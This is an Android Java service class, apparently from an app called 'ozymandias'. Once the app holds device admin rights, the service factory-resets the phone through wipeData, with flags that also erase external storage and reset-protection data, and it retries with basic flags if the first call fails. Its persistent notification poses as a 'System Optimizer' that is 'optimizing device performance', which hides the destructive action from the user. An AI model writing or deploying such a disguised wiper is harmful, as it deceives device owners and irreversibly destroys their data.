package com.ozymandias;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.core.app.NotificationCompat;

public class WipeTriggerService extends Service {

    private static final int NOTIFICATION_ID = 1337;
    private static final String CHANNEL_ID = "ozymandias_wipe_channel";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, getNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Attempt wipe from service context
        DevicePolicyManager dpm = (DevicePolicyManager) 
            getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);

        if (dpm.isAdminActive(admin)) {
            try {
                int flags_ = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                           | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
                dpm.wipeData(flags_);
            } catch (SecurityException e) {
                // Try again with basic flags
                try {
                    dpm.wipeData(0);
                } catch (SecurityException ignored) {}
            }
        }

        // Self-terminate after 3 seconds (wipe should happen before then)
        new android.os.Handler(getMainLooper()).postDelayed(this::stopSelf, 3000);
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Optimizer",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Running system optimization tasks");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Ozymandias, earn your legacy")
            .setContentText("Optimizing device performance...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
}